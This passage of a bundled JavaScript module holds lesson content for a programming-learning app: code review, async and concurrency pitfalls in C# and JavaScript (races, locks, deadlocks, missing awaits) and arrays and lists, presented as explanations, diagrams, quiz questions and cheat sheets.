           "Nguyen Van An");`},choices:["Phone and email are swapped; primitive obsession","The name is too long; long method","Nothing is wrong; the compiler checked the types","The email is missing; duplicated code"],answer:0,why:"All three parameters are `string`, so the compiler cannot catch the swap. With `Email` and `PhoneNumber` types, this call would not compile."}]},{id:"clean-code.review",title:"Code review that helps",summary:"Look for real problems, keep PRs small, be kind and specific.",minutes:4,blocks:[{type:"text",text:"A **pull request** (PR) asks to merge your branch into the main code. In a **code review**, a teammate reads it first. The goal is better code and shared knowledge, not winning an argument."},{type:"diagram",text:`What to look for (most important first)

1. Correctness   Does it do the right thing?
2. Edge cases    null, empty, 0, duplicates?
3. Readability   Easy for the next person?
4. Tests         Do they cover the change?
─────────────────────────────────────────
5. Style         Let the linter handle it`},{type:"text",text:"A **linter** is a tool that checks style automatically: spacing, quotes, unused imports. Let tools handle style. Humans should spend their time on logic."},{type:"compare",left:{title:"Small PR",items:["About 200 lines, one purpose","Reviewed carefully","Bugs are easy to spot","Easy to revert"]},right:{title:"Huge PR",items:["3,000 lines, five purposes","Waits days for review","Reviewer skims and approves","Hard to undo one part"]}},{type:"text",text:"Good review comments are **kind** and **specific**. Talk about the code, not the person. Say what is wrong and why, and suggest a fix."},{type:"diagram",text:`Bad:  "This is wrong."
Bad:  "Why would you do this??"

Good: "If items is empty, line 42
       divides by 0. Return 0 early?"
Good: "nit: maybe orderCount here?
       Not a blocker."`},{type:"text",text:'Mark small, optional points with **nit:** (short for "nitpick"). Then the author knows they do not block the merge.'},{type:"example",title:"Two reviewers",text:"Reviewer A leaves 30 comments about spaces and quotes. A misses a missing null check. Reviewer B leaves 3 comments: a bug, a missing test and an unclear name. B saved the team a production incident."}],remember:"Review for bugs, edge cases, clarity and tests. Let the linter handle style.",questions:[{id:"clean-code.review.1",kind:"scenario",difficulty:"easy",prompt:"You review a PR. Which comment is the most helpful?",choices:['"This code is bad, please redo it."','"If `items` is empty, line 42 divides by 0."','"Why did you not think about this??"','"I would never write it this way."'],answer:1,why:"It points to a line, names the problem and lets the author fix it fast. The others judge the person and give nothing to act on."},{id:"clean-code.review.2",kind:"compare",difficulty:"medium",prompt:"A feature needs 2,500 changed lines. Which is better for review?",choices:["One PR with everything, so the reviewer sees the full picture","Several small PRs, each with one purpose and its own tests"],answer:1,why:"Reviewers check small PRs carefully and skim huge ones. Small PRs also merge sooner and are easier to revert. A short description can still explain the big picture."},{id:"clean-code.review.3",kind:"mcq",difficulty:"medium",prompt:"A reviewer spends most comments on spacing, quote style and import order. What is the better approach?",choices:["Let a linter and formatter enforce style automatically","Write a style guide and ask every author to read it","Reject every PR until the style is perfect","Ignore style completely, since it never matters"],answer:0,why:"Tools fix style in seconds and never argue. Human review time is better spent on correctness, edge cases and tests."},{id:"clean-code.review.4",kind:"debug",difficulty:"hard",prompt:"A PR passed review with two approvals. In production, `GetAverage` crashes for every new user. What did the review most likely miss?",code:{lang:"csharp",text:`decimal GetAverage(List<decimal> scores)
{
    return scores.Sum() / scores.Count;
}`},choices:["The edge case of an empty list: new users have no scores","The method name should be `CalculateAverageScore`","The code should use `double` instead of `decimal`","The braces should be on the same line as the method"],answer:0,why:"New users have zero scores, so `Count` is 0 and the `decimal` division throws. Edge cases like empty, null and zero are what review should check. Names and braces are minor.",remember:"Always ask: what if it is empty, null or zero?"}]}],cheatSheet:[{title:"Names",items:[{term:"Intention-revealing name",meaning:"Says what it is and why: `unpaidInvoices`, not `list`"},{term:"Boolean name",meaning:"Reads as a question: `isActive`, `hasStock`, `canEdit`"},{term:"Unit in the name",meaning:"`timeoutMs`, `priceVnd`, `weightKg` — nobody guesses the unit"},{term:"Noise words",meaning:"`data`, `info`, `manager`, `helper` — add length, not meaning"},{term:"Magic number",meaning:"Raw value with no name → use a named constant"}]},{title:"Functions",items:[{term:"One job",meaning:'You can describe it in one sentence without "and"'},{term:"Guard clause",meaning:"Check a bad case first and return early"},{term:"Arrow code",meaning:"Deeply nested ifs → flatten with guard clauses"},{term:"Many parameters",meaning:"Group them into one object with named fields"}]},{title:"Principles",items:[{term:"DRY",meaning:"One place for each piece of knowledge"},{term:"KISS",meaning:"The simplest solution that works"},{term:"YAGNI",meaning:"Do not build it until a real need arrives"},{term:"Rule of three",meaning:"Extract shared code at the third copy, not the second"},{term:"Wrong DRY",meaning:"Merging look-alike code that changes for different reasons"}]},{title:"Errors and comments",items:[{term:"Fail fast",meaning:"Stop at the first sign of a problem, close to the cause"},{term:"Validate at the edge",meaning:"Check input where it enters: API, form, file import"},{term:"Empty catch",meaning:"Hides errors → log with context and rethrow"},{term:"Result value",meaning:'For expected failures like "out of stock" or "wrong password"'},{term:"Good comment",meaning:"Explains why, warns, or links a ticket"}]},{title:"Smells and review",items:[{term:"Long method / big class",meaning:"Does many jobs → extract and split"},{term:"Primitive obsession",meaning:"Plain string for an idea with rules → small type"},{term:"Feature envy",meaning:"Uses another class's data → move the method there"},{term:"Safe refactor",meaning:"Small steps, tests green, separate commit"},{term:"Review focus",meaning:"Correctness, edge cases, readability, tests"},{term:"nit:",meaning:"Small optional comment, not a blocker"}]}]},k=Object.freeze(Object.defineProperty({__proto__:null,default:b},Symbol.toStringTag,{value:"Module"})),v={id:"concurrency",title:"Async & Concurrency",emoji:"🔄",tagline:"Tasks, races, locks — when two things happen at once",lessons:[{id:"concurrency.basics",title:"Process, thread, task",summary:"Who actually runs your code.",minutes:3,blocks:[{type:"text",text:`A **process** is a running program. It has its own memory. Two processes cannot read each other's variables.
A **thread** is a worker inside a process. All threads of one process **share the same memory**.`},{type:"diagram",text:`Process: MyApi.exe  (own memory)
┌────────────────────────────────────┐
│  shared memory: caches, statics    │
│                                    │
│  Thread 1   Thread 2   Thread 3    │
│     │          │          │        │
│  request A  request B  request C   │
└────────────────────────────────────┘
Process: MyWorker.exe  (separate memory)`},{type:"text",text:"A **task** (`Task` in C#, `Promise` in JS) is **a piece of work that will finish later**. It is not a thread. Many tasks can share a few threads. Why? Most tasks spend their time **waiting** (for the database, the network, a file).\nThe threads come from a **thread pool**: a group of ready threads that the app reuses."},{type:"example",title:"Restaurant",text:"Threads are the waiters. Tasks are the orders. A good waiter does not stand at the kitchen door waiting for one dish. They take other orders and come back when the dish is ready."},{type:"text",text:"Shared memory is fast and convenient. It is also where most concurrency bugs live: two threads changing the same object at the same time."}],remember:"Process = own memory. Threads = share memory. Task = work that finishes later.",questions:[{id:"concurrency.basics.1",kind:"scenario",difficulty:"easy",prompt:"Your API runs as **2 separate processes** on one machine. Each keeps an in-memory cache in a static `Dictionary`. Process 1 clears its cache. What happens to the cache in process 2?",choices:["It is cleared too, because both run the same code","Process 2 throws an exception on its next read","Nothing — each process has its own memory","It is cleared after a short sync delay"],answer:2,why:"Processes do not share memory. Each one has its own copy of every static field, so clearing one cache does not touch the other.",remember:"Separate processes = separate memory."},{id:"concurrency.basics.2",kind:"mcq",difficulty:"medium",prompt:"An ASP.NET Core server handles 2,000 requests at the same time with only about 50 threads. How is that possible?",choices:["Each request gets its own CPU core for a moment","The server queues requests and runs them one by one","Each thread runs many requests at the same instant","Waiting requests give their thread back to the pool"],answer:3,why:"While a request awaits the database or network, its thread goes back to the pool and serves another request. Threads are only needed while code is actually running."},{id:"concurrency.basics.3",kind:"truefalse",difficulty:"easy",prompt:"Every `Task` you create in C# gets its own thread.",choices:["True","False"],answer:1,why:"A task is a promise of a future result, not a thread. An I/O task may use no thread at all while it waits. Threads from a shared pool run the code before and after each wait."}]},{id:"concurrency.async-await",title:"async / await: waiting without blocking",summary:"What really happens at an await.",minutes:4,blocks:[{type:"text",text:'`await` means: "pause **this method** until the task is done, but **let the thread do other work** meanwhile."'},{type:"compare",left:{title:"Blocking ⚠️",items:["`Thread.Sleep`, `.Result`, `.Wait()`","The thread does nothing and waits","Nobody else can use it"]},right:{title:"Awaiting ✅",items:["`await Task.Delay`, `await GetAsync()`","The method pauses","The thread goes back to help others"]}},{type:"code",code:{lang:"csharp",text:`public async Task<Order> GetOrder(int id)
{
    // runs on a pool thread
    var order = await db.Orders.FindAsync(id);
    // thread was released during the DB call,
    // now a pool thread continues here
    return order;
}`}},{type:"text",text:"An async method runs **normally (synchronously)** until it hits the first `await` of a task that is not finished yet. At that point, it returns to the caller."},{type:"text",text:"**JavaScript** is different: your code runs on **one thread** (the event loop). `await` lets the loop run other callbacks while you wait. If your code does heavy CPU work without awaiting, **everything else waits** — other requests, clicks, timers."},{type:"diagram",text:`JS event loop (one thread)
  run sync code until it ends or awaits
        ↓
  run all microtasks (promise callbacks)
        ↓
  run next macrotask (timer, I/O event)
        ↓
  repeat`}],remember:"await = pause the method, not the thread.",questions:[{id:"concurrency.async-await.1",kind:"code",difficulty:"medium",prompt:"What does this C# code print?",code:{lang:"csharp",text:`async Task WorkAsync()
{
    Console.WriteLine("2");
    await Task.Delay(100);
    Console.WriteLine("4");
}

Console.WriteLine("1");
var t = WorkAsync();
Console.WriteLine("3");
await t;`},choices:["1 2 3 4","1 3 2 4","1 2 4 3","1 3 4 2"],answer:0,why:'WorkAsync runs synchronously until its first real await, so "2" prints right away. Then it returns a task, "3" prints, and "4" comes after the delay.',remember:"Async methods run synchronously until the first await."},{id:"concurrency.async-await.2",kind:"code",difficulty:"hard",prompt:"What does this JavaScript print?",code:{lang:"js",text:`console.log('A');
setTimeout(() => console.log('B'), 0);
Promise.resolve().then(() => console.log('C'));
console.log('D');`},choices:["A B C D","A D B C","A D C B","A C D B"],answer:2,why:"Sync code runs first (A, D). Then the microtask queue runs (promise callback C). Only then the timer callback runs (B), even with a 0 ms delay.",remember:"Sync → microtasks (promises) → timers."},{id:"concurrency.async-await.3",kind:"perf",difficulty:"medium",prompt:"A Node.js API has one endpoint that builds a big report with a 2-second CPU loop (no awaits). While it runs, **all** other endpoints stop responding. Why?",choices:["Node.js allows one request per endpoint at a time","The loop keeps the only JS thread busy","The report holds a lock on the database","Garbage collection pauses during long loops"],answer:1,why:"All JS code shares one event loop thread. A long synchronous loop keeps it busy, so other requests cannot even start. Move heavy CPU work to a worker thread or another service.",remember:"Never block the event loop with long CPU work."},{id:"concurrency.async-await.4",kind:"compare",difficulty:"easy",prompt:"Inside an ASP.NET Core controller you need to wait 5 seconds before retrying a call. Which is better?",choices:["`Thread.Sleep(5000);`","`Task.Delay(5000).Wait();`","`await Task.Delay(5000);`"],answer:2,why:"`Thread.Sleep` and `.Wait()` both hold a pool thread doing nothing for 5 seconds. `await Task.Delay` gives the thread back so it can serve other requests."}]},{id:"concurrency.parallel",title:"Concurrency vs parallelism",summary:"Many things in progress vs many things at the same instant.",minutes:3,blocks:[{type:"text",text:`**Concurrency** = several tasks are **in progress** at the same time. They may take turns on one thread.
**Parallelism** = several tasks run at the **exact same moment**, on different CPU cores.`},{type:"diagram",text:`Concurrency (1 cook, 3 dishes, switching)
  cook: [A][B][A][C][B][C]

Parallelism (3 cooks, 3 dishes, together)
  cook 1: [A A A]
  cook 2: [B B B]
  cook 3: [C C C]`},{type:"text",text:"For **waiting work** (HTTP, DB), start everything first, then wait for all. You do not need more threads for that."},{type:"code",code:{lang:"ts",text:`// Sequential: 3 calls × 200 ms ≈ 600 ms
const a = await getUser(id);
const b = await getOrders(id);
const c = await getInvoices(id);

// Concurrent: all start now ≈ 200 ms
const [a2, b2, c2] = await Promise.all([
  getUser(id), getOrders(id), getInvoices(id),
]);`}},{type:"text",text:"C# has the same idea: start the tasks, then `await Task.WhenAll(t1, t2, t3)`.\nBut be careful: if you start 10,000 calls at once, you overload the other server. Limit how many run at once (for example `Parallel.ForEachAsync` with `MaxDegreeOfParallelism`, or a `SemaphoreSlim`)."}],remember:"Independent waits → start all, then await all. But limit how many run at once.",questions:[{id:"concurrency.parallel.1",kind:"perf",difficulty:"easy",prompt:"This page loads in 2 seconds. Each `fetchUser` takes about 200 ms and the calls do not depend on each other. What is the best fix?",code:{lang:"ts",text:`const users = [];
for (const id of ids) {          // 10 ids
  users.push(await fetchUser(id));
}`},choices:["Store the results in a `Map` instead of an array","Switch to a classic `for (let i = 0; ...)` loop","Wrap each call in its own `try/catch`","Use `Promise.all(ids.map(fetchUser))`"],answer:3,why:"The loop waits for each call before starting the next: 10 × 200 ms. `Promise.all` starts all 10 at once, so the total is about one call's time.",remember:"await in a loop = one at a time."},{id:"concurrency.parallel.2",kind:"scenario",difficulty:"hard",prompt:"A nightly job does `await Promise.all(customers.map(sendToCrm))` for 50,000 customers. The CRM starts returning `429 Too Many Requests` and the job fails. What is the best fix?",choices:["Run them with a limit, like 10 at a time","Switch to a plain sequential `for` loop","Retry the whole job right away on 429","Use `Promise.allSettled` instead of `Promise.all`"],answer:0,why:"Starting 50,000 requests at once overloads the CRM. A limit keeps the job fast without overloading the CRM. A sequential loop works but takes hours, and `allSettled` only changes how errors are reported.",remember:"Unlimited concurrency is a denial-of-service attack on your partner."},{id:"concurrency.parallel.3",kind:"mcq",difficulty:"medium",prompt:"You resize 1,000 images (pure CPU work) in a C# console app. Which helps the most on an 8-core machine?",choices:["Make each resize method `async` and await it","Add `ConfigureAwait(false)` to every await","Use `Parallel.ForEach` across the cores","Run it on one thread with a tighter loop"],answer:2,why:"async/await helps when you wait for I/O. CPU work needs more cores working at the same time, which is parallelism.",remember:"I/O-bound (waiting) → async. CPU-bound (computing) → parallel."}]},{id:"concurrency.race",title:"Race conditions",summary:"When the result depends on who finishes first.",minutes:4,blocks:[{type:"text",text:"A **race condition** happens when two tasks use the same data at the same time. The result then depends on which one finishes first."},{type:"text",text:"Even `count++` is not **atomic** (done in one step that nothing can interrupt). It is three steps: **read**, **add 1**, **write**. Two threads can mix their steps:"},{type:"diagram",text:`count = 5
Thread A: read 5 ─────────────── write 6
Thread B:      read 5 ── write 6
Result: 6   (expected 7 — one update is lost)`},{type:"text",text:"The most common shape is **check-then-act**: you check something, then act on it, but the data changed in between."},{type:"code",code:{lang:"csharp",text:`if (account.Balance >= amount)       // check
{
    // another request can withdraw here!
    account.Balance -= amount;        // act
}`}},{type:"text",text:"**JavaScript too.** It has one thread, so `count++` is safe. But every `await` is a gap where other code can run."},{type:"code",code:{lang:"ts",text:`async function withdraw(id: string, amount: number) {
  const balance = await getBalance(id);   // gap
  if (balance >= amount) {
    await setBalance(id, balance - amount); // gap
  }
}
// two calls at once can both see the old balance`}},{type:"example",title:"Why races are hard to find",text:"They pass every test on your laptop. Then they appear in production once a week, under heavy load. Nobody can reproduce them."}],remember:"Shared data + no coordination + bad timing = race condition.",questions:[{id:"concurrency.race.1",kind:"code",difficulty:"medium",prompt:"What does this print?",code:{lang:"csharp",text:`int count = 0;
var tasks = Enumerable.Range(0, 1000)
    .Select(_ => Task.Run(() =>
    {
        for (int i = 0; i < 1000; i++) count++;
    }));
await Task.WhenAll(tasks);
Console.WriteLine(count);`},choices:["Always 1,000,000, because `Task.WhenAll` waits for all","Usually less than 1,000,000, different each run","Always 1,000 — one per task","It throws an `InvalidOperationException`"],answer:1,why:"`count++` is read-add-write. Tasks on different threads overwrite each other's updates, so some increments are lost. .NET does not detect this for you.",remember:"`count++` is not atomic."},{id:"concurrency.race.2",kind:"debug",difficulty:"medium",prompt:"Users sometimes get **two** welcome emails after signing up. The code checks `if (!user.WelcomeSent)`, sends the email, then sets `WelcomeSent = true`. Signup can run this code from two places at once. What is the most likely cause?",choices:["The email provider retries the send and delivers duplicates","The compiler evaluates the `if` condition twice","The SMTP client is not thread-safe","Both runs read `false` before either one saves `true`"],answer:3,why:"A check-then-act race: both callers check before either one writes the flag. Make the check and the update one atomic step. For example: `UPDATE ... SET WelcomeSent = 1 WHERE Id = @id AND WelcomeSent = 0` and send only if 1 row changed.",remember:"Check-then-act needs to be one atomic step."},{id:"concurrency.race.3",kind:"truefalse",difficulty:"medium",prompt:"Because Node.js runs JavaScript on one thread, async code in Node.js cannot have race conditions.",choices:["True","False"],answer:1,why:"One line of JS never runs at the same time as another. But between two `await`s, other requests can run and change shared state, so read-then-write logic can still race."},{id:"concurrency.race.4",kind:"scenario",difficulty:"hard",prompt:"A singleton service (one instance for the whole app) in ASP.NET Core keeps `private readonly List<string> _recent = new();` and every request calls `_recent.Add(...)`. Under load you see rare `IndexOutOfRangeException`s inside `List.Add`. What is going on?",choices:["Many threads call `Add` on one list at once","The list grew beyond its maximum capacity of items","A known bug in `List<T>` on older .NET versions","The garbage collector moved the list during `Add`"],answer:0,why:"A singleton is shared by all requests, which run on many threads. `List<T>` is not safe for concurrent writes, so its internal array and count can stop matching.",remember:"Singleton + mutable collection = shared state across threads."}]},{id:"concurrency.locks",title:"Locks and thread-safe tools",summary:"Let only one thread in at a time.",minutes:4,blocks:[{type:"text",text:"A **lock** lets only one thread run a piece of code at a time. Others wait at the door. Code is **thread-safe** when it works correctly even if many threads call it at once."},{type:"code",code:{lang:"csharp",text:`private readonly object _gate = new();
private decimal _balance;

public bool Withdraw(decimal amount)
{
    lock (_gate)              // one thread at a time
    {
        if (_balance < amount) return false;
        _balance -= amount;   // check + act are now safe
        return true;
    }
}`}},{type:"text",text:"You cannot `await` inside `lock` — the compiler rejects it. For async code, use `SemaphoreSlim`:"},{type:"code",code:{lang:"csharp",text:`private readonly SemaphoreSlim _sem = new(1, 1);

await _sem.WaitAsync();
try
{
    await RefreshTokenAsync();
}
finally
{
    _sem.Release();   // always release, even on error
}`}},{type:"list",items:["`Interlocked.Increment(ref count)` — atomic counter, no lock needed.","`ConcurrentDictionary` — safe for many readers and writers.","`lock` — protect a few lines that touch shared state. Keep it short.","`SemaphoreSlim` — like a lock that works with `await`, or lets N in at a time."]},{type:"text",text:"Locks only work **inside one process**. If you run 3 copies of your API, each has its own lock. For that, see the Distributed Systems category."}],remember:"Short lock for sync code. SemaphoreSlim for async code. Interlocked for counters.",questions:[{id:"concurrency.locks.1",kind:"code",difficulty:"easy",prompt:"Why does this not compile?",code:{lang:"csharp",text:`lock (_gate)
{
    var token = await LoadTokenAsync();
    _cache = token;
}`},choices:["The lock object `_gate` must be a `string`","`lock` needs a timeout argument when used in async code","`await` is not allowed inside a `lock` block","Fields cannot be assigned inside a `lock` block"],answer:2,why:"A `lock` belongs to the thread that took it. After an `await`, the code may continue on another thread. So C# does not allow it. Use `SemaphoreSlim.WaitAsync` instead.",remember:"No await in lock → SemaphoreSlim."},{id:"concurrency.locks.2",kind:"compare",difficulty:"easy",prompt:"Many threads increment a shared `int` request counter. Which is the best choice?",choices:["`count++` with no protection","`Interlocked.Increment(ref count)`","A `lock` around a `Thread.Sleep(1)` and `count++`"],answer:1,why:"`Interlocked.Increment` is atomic and very cheap. Plain `count++` loses updates. Sleeping inside a lock only makes everyone wait longer."},{id:"concurrency.locks.3",kind:"perf",difficulty:"medium",prompt:'A team wraps a whole request handler in one global `lock` to "fix" a race. The bug is gone, but the API now handles only 40 requests/second instead of 800. Why?',choices:["Requests now run one at a time","Each lock allocates a lot of memory","The lock adds a database round trip","The lock turns off the thread pool"],answer:0,why:"Only one request at a time can run the code inside a lock. Protect only the few lines that touch shared state. Or use a thread-safe type. Then the rest can still run in parallel.",remember:"Lock as little code as possible."},{id:"concurrency.locks.4",kind:"debug",difficulty:"hard",prompt:"You use `cache.GetOrAdd(key, k => LoadExpensive(k))` on a `ConcurrentDictionary`. Logs show `LoadExpensive` sometimes runs **twice** for the same key. Why?",choices:["`ConcurrentDictionary` is not thread-safe for writes","Two different dictionary instances were created","`GetOrAdd` always calls the factory twice by design","Two threads ran the factory; one result was kept"],answer:3,why:"GetOrAdd keeps the dictionary correct. But it does not lock while your factory (the function that creates the value) runs. If the factory must run once, store `Lazy<T>` values or use a lock/semaphore around the load.",remember:"Thread-safe collection ≠ your factory runs once."}]},{id:"concurrency.deadlock",title:"Deadlocks and starvation in code",summary:"When everybody waits and nobody works.",minutes:4,blocks:[{type:"text",text:"A **deadlock** in code: two threads each hold something the other needs, so both wait forever. No error. No CPU. The app just hangs."},{type:"diagram",text:`Thread 1: lock(A) ── wants B ──┐
                               ▼
Thread 2: lock(B) ── wants A ──┘
Fix: always take locks in the same order`},{type:"text",text:"The classic .NET async deadlock is **blocking on async code** with `.Result` or `.Wait()`. It happens in apps with a UI thread (WinForms, WPF) and in old ASP.NET."},{type:"code",code:{lang:"csharp",text:`// WPF button click
void Load_Click(object sender, RoutedEventArgs e)
{
    var text = LoadAsync().Result;   // UI thread blocks
}

async Task<string> LoadAsync()
{
    var s = await http.GetStringAsync(url);
    return s;  // wants to continue on the UI thread,
}              // but the UI thread is blocked → hang`}},{type:"text",text:"ASP.NET Core has no UI thread, so this exact hang is rare there. But blocking is still bad: each `.Result` holds a pool thread doing nothing. Under load the pool runs out of threads (**thread-pool starvation**), and new threads are added slowly. Requests wait in a queue, but the CPU looks idle."},{type:"list",items:['Use `await` all the way up ("async all the way").',"Never call `.Result` / `.Wait()` / `GetAwaiter().GetResult()` in code that runs often (hot paths).","Take multiple locks in one fixed order."]}],remember:"Don't block on async code. Await it.",questions:[{id:"concurrency.deadlock.1",kind:"debug",difficulty:"medium",prompt:'A WPF app freezes forever when you click "Load". The click handler calls `GetDataAsync().Result`. There is no exception. What is the most likely cause?',choices:["The server is too slow and has no timeout","UI thread and task wait for each other","WPF does not allow HTTP calls on the UI thread","The task was created but never started"],answer:1,why:"`.Result` blocks the UI thread. The code after `await` inside GetDataAsync wants to resume on the UI thread. Each waits for the other: deadlock. Make the handler `async` and `await` the call."},{id:"concurrency.deadlock.2",kind:"perf",difficulty:"hard",prompt:"An ASP.NET Core API gets very slow at peak traffic. CPU is only 15% and the database is fine. But the thread count keeps growing, and each request takes seconds. The code has many `.Result` calls on HTTP requests to another service. What is happening?",choices:["The database is deadlocked on the hot tables","The JSON serializer is too slow under load","Thread-pool starvation from blocked threads","The garbage collector is pausing all threads"],answer:2,why:"Each blocked call holds a pool thread that does nothing. The pool adds threads slowly, so incoming work queues up even though CPU is low. Replace `.Result` with `await`.",remember:"Low CPU + rising thread count + slow requests → look for blocking calls."},{id:"concurrency.deadlock.3",kind:"scenario",difficulty:"medium",prompt:"`Transfer(a, b)` does `lock(a) { lock(b) { ... } }`. Two requests run `Transfer(acc1, acc2)` and `Transfer(acc2, acc1)` at the same time, and the app hangs. What is the simplest fix?",choices:["Lock accounts in a fixed order, like lower id first","Remove both locks and rely on `decimal` being atomic","Add a short `Thread.Sleep` between the two locks","Run every transfer on a background thread"],answer:0,why:"The hang is a cycle: each request holds one account and waits for the other. If everyone locks in the same order (by id), the cycle cannot form."},{id:"concurrency.deadlock.4",kind:"compare",difficulty:"easy",prompt:"You are inside an `async Task` method in ASP.NET Core and need the result of `GetPriceAsync()`. Which is better?",choices:["`var p = GetPriceAsync().Result;`","`var p = await GetPriceAsync();`"],answer:1,why:"`await` frees the thread while waiting. `.Result` blocks a thread and can cause deadlocks or thread-pool starvation."}]},{id:"concurrency.pitfalls",title:"Async traps: async void, missing await, lost errors",summary:"Small mistakes that hide errors.",minutes:4,blocks:[{type:"text",text:"Async bugs often have **no error message**. The error happened, but nobody was listening."},{type:"list",items:["**Forgetting `await`** — the work starts, the code moves on, and errors are lost. The work may not even be finished when you use its result.","**`async void`** (C#) — the caller cannot await it or catch its exceptions. An exception there can crash the whole process. Only use it for event handlers.","**Unhandled promise rejection** (JS) — a rejected promise that nobody awaits or handles with `.catch`. Modern Node.js crashes the process on it by default.","**Fire-and-forget** — starting work and not waiting for it. This is OK only if you log its errors. Also accept that the work can be lost on restart."]},{type:"code",code:{lang:"ts",text:`try {
  saveAudit(entry);        // ❌ no await
} catch (e) {
  log(e);                  // never runs for async errors
}

try {
  await saveAudit(entry);  // ✅ errors go to catch
} catch (e) {
  log(e);
}`}},{type:"code",code:{lang:"csharp",text:`// ❌ caller can't await or catch
public async void SendEmail() { ... }

// ✅ return a Task
public async Task SendEmailAsync() { ... }`}},{type:"text",text:"Turn on the warnings: in C#, CS4014 warns when you call an async method without awaiting it. In TypeScript, the ESLint rule `no-floating-promises` does the same."}],remember:"Every task/promise should be awaited, returned, or explicitly handled.",questions:[{id:"concurrency.pitfalls.1",kind:"debug",difficulty:"medium",prompt:'A save button shows "Saved!", but sometimes the data is not in the database. There is no error in the logs. The code is below. What is wrong?',code:{lang:"ts",text:`async function onSave() {
  try {
    api.saveOrder(order);
    showToast('Saved!');
  } catch (e) {
    showError(e);
  }
}`},choices:["`showToast` must be awaited before the request ends","`try/catch` does not work inside `async` functions","`saveOrder` is not awaited, so errors skip `catch`","`onSave` should not be marked `async` at all"],answer:2,why:"Without `await`, the toast shows right after the request starts. If the request fails later, the rejection happens outside the try block, so the catch never sees it.",remember:"No await → no catch."},{id:"concurrency.pitfalls.2",kind:"scenario",difficulty:"hard",prompt:"In an ASP.NET Core service, a teammate writes `public async void NotifyAsync()` and calls it after saving an order. One day the notification server is down and the **whole API process crashes**. Why?",choices:["The notification server sent back a kill signal","ASP.NET Core forbids async methods in singleton services","The order was saved twice and hit a constraint","Nobody can catch an exception from `async void`"],answer:3,why:"An `async void` method has no Task to carry its exception. The exception is thrown where nobody can catch it, which can crash the process. Return `Task` and await it, or catch inside.",remember:"async void only for event handlers."},{id:"concurrency.pitfalls.3",kind:"mcq",difficulty:"medium",prompt:"You call `Promise.all([a(), b(), c()])` and `b()` rejects after 50 ms. What happens to `a()` and `c()`?",choices:["They are cancelled automatically","They keep running in the background","They are retried once automatically","`Promise.all` waits for them, then rejects"],answer:1,why:"Promises cannot be cancelled by Promise.all. It rejects at the first failure, while the other operations keep going in the background. Use `Promise.allSettled` if you need every result."}]}],cheatSheet:[{title:"Basics",items:[{term:"Process",meaning:"Running program with its own memory"},{term:"Thread",meaning:"Worker inside a process — shares memory with other threads"},{term:"Task / Promise",meaning:"Work that finishes later. Not a thread"},{term:"await",meaning:"Pause the method, free the thread"},{term:"Concurrency",meaning:"Many things in progress, may take turns"},{term:"Parallelism",meaning:"Many things at the exact same moment, on many cores"},{term:"JS event loop",meaning:"One thread: sync code → microtasks (promises) → timers / I/O"}]},{title:"Thread safety (C#)",items:[{term:"Race condition",meaning:"Result depends on timing; often check-then-act or count++"},{term:"lock",meaning:"One thread at a time; no await inside"},{term:"SemaphoreSlim(1,1)",meaning:"Async-friendly lock: WaitAsync + try/finally Release"},{term:"Interlocked",meaning:"Atomic counters and swaps, no lock"},{term:"ConcurrentDictionary",meaning:"Thread-safe map; GetOrAdd factory may run twice"},{term:"Singleton + List<T>",meaning:"Shared by all requests → not thread-safe"}]},{title:"Common traps",items:[{term:".Result / .Wait()",meaning:"Blocks a thread → deadlock (UI) or thread-pool starvation"},{term:"async void",meaning:"Cannot be awaited or caught — event handlers only"},{term:"Missing await",meaning:"Errors skip your catch, work may not be done yet"},{term:"await in a loop",meaning:"Runs one by one → Promise.all / Task.WhenAll"},{term:"Promise.all on 50k items",meaning:"Overloads the other server → limit concurrency"},{term:"Deadlock (code)",meaning:"Locks taken in different orders → use one fixed order"}]}]},T=Object.freeze(Object.defineProperty({__proto__:null,default:v},Symbol.toStringTag,{value:"Module"})),x={id:"data-structures",title:"Data Structures",emoji:"🧱",tagline:"List, Map, Set, Queue, Tree — pick the right box",lessons:[{id:"data-structures.array-list",title:"Array and List",summary:"A row of boxes: fast by position, slow at the front.",minutes:4,blocks:[{type:"text",text:`An **array** is a row of boxes, side by side in memory. Each box has a number (the **index**), starting at 0.
Because the boxes are side by side, the computer can jump straight to box 3. No searching.`},{type:"diagram",text:`index:  0     1     2     3     4
      ┌─────┬─────┬─────┬─────┬─────┐
      │ "a" │ "b" │ "c" │ "d" │ "e" │
      └─────┴─────┴─────┴─────┴─────┘
arr[3] → jump straight to box 3 → "d"   O(1)`},{type:"text",text:"A C# array (`int[]`) has a fixed size. `List<T>` is an array that can grow. When it is full, it creates a new array about 2× bigger. Then it copies all items into it. A JS/TS `Array` grows in a similar way."},{type:"text",text:"Adding at the **end** is cheap. Inserting at the **front** is not: every item must move one box to the right."},{type:"diagram",text:`Insert "x" at index 0:
before  [a][b][c][d][e]
          ↘  ↘  ↘  ↘  ↘     every item moves 1 box
after   [x][a][b][c][d][e]       → O(n)`},{type:"code",code:{lang:"csharp",text:`var names = new List<string>();
names.Add("Ana");                 // O(1) on average
var first = names[0];             // O(1) — jump by index
names.Insert(0, "Bob");           // O(n) — shift everything right
names.RemoveAt(0);                // O(n) — shift everything left
bool has = names.Contains("Ana"); // O(n) — checks one by one`}},{type:"compare",left:{title:"Use it when ✅",items:["You read by position: `items[i]`","You mostly add at the end","You loop over all items in order",'You just need "a group of things"']},right:{title:"Avoid it when ⚠️",items:["You often search by id → Dictionary","You often insert/remove at the front",'You need "no duplicates" → Set']}},{type:"example",title:"Real world",text:"Lines in a shopping cart, search results in ranked order, points on a chart. You show them in order and loop over them. A list is perfect."}],remember:"Array/List = fast by index and at the end. Slow to search and slow at the front.",questions:[{id:"data-structures.array-list.1",kind:"mcq",difficulty:"easy",prompt:"You have a `List<Product>` with 1 million items. Which operation does the most work?",choices:["`products[500000]`","`products.Add(p)`","`products.Count`","`products.Insert(0, p)`"],answer:3,why:"Inserting at index 0 moves all 1 million items one position to the right. Reading by index and `Count` are O(1), and `Add` at the end is O(1) on average.",remember:"Insert at the front of a list = move everything."},{id:"data-structures.array-list.2",kind:"scenario",difficulty:"medium",prompt:"A signup check runs `blockedEmails.Contains(email)` on a `List<string>` with 50,000 emails, many times per second. CPU is high. What is the problem?",choices:["Lists cannot hold 50,000 items safely","`Contains` checks items one by one (O(n)) — a HashSet fits better","Nothing — `List.Contains` is O(1) like a dictionary","The list should be sorted before every call"],answer:1,why:'`List.Contains` walks the list until it finds a match, up to 50,000 checks per call. A `HashSet<string>` answers "is it here?" in O(1) on average.',remember:'"Is it in here?" many times → use a Set, not a List.'},{id:"data-structures.array-list.3",kind:"mcq",difficulty:"medium",prompt:'Why is `List<T>.Add` called 